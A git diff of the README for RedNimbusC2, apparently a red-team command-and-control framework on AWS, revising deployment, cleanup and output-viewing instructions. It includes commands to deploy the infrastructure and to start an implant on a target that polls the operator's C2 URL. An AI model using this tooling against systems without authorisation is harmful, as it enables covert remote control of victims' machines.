@@ -72,20 +72,16 @@ cd RedNimbusC2
 # deploy RedNimbusC2 resources to AWS
 make deploy
 
+# Your C2 URL will be found in this file
+# after deployingment:
+#     RedNimbusC2/nimbus_c2_url.json
+
 # optionally deploy to a specific AWS account like so:
-# make deploy AWS_PROFILE=<your_profile>
+#     make deploy AWS_PROFILE=<your_profile>
 ```
 
 See [here](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-profiles.html) for info on configuring AWS CLI profiles.
 
-:exclamation: To remove the Red Nimbus C2 infrastructure on AWS:
-
-```bash
-# remove nimbusc2 binaries and AWS infrastructure
-# this will destroy any operational data you may have
-# in S3, so be sure to backup your data before uninstalling if necessary 
-make destroy
-```
 
 3. **Install the Red Nimbus C2 Operator Client**
 
@@ -121,6 +117,8 @@ Once the agent is on target, you can execute it as follows:
 python3 agent.py --help
 
 # start C2 loop
+# get your API Gateway URL from this file:
+# RedNimbusC2/nimbus_c2_url.json
 python3 agent.py --url <AWS API Gateway URL>
 ```
 
@@ -156,12 +154,17 @@ nimbusc2.py --remove-task --task-id <task_id>
 
 ### View Task Output
 
-TBD
+At this time you can view agent output in AWS CloudWatch.
+
+A future enhancement will be added to integrate agent task output with the operator client terminal.
 
 ### Cleanup
 
-You can task all implants to terminate and delete by issuing this command:
+:exclamation: To remove the Red Nimbus C2 infrastructure on AWS:
 
-```
-TBD
+```bash
+# remove nimbusc2 binaries and AWS infrastructure
+# this will destroy any operational data you may have
+# in S3, so be sure to backup your data before uninstalling if necessary 
+make destroy
 ```
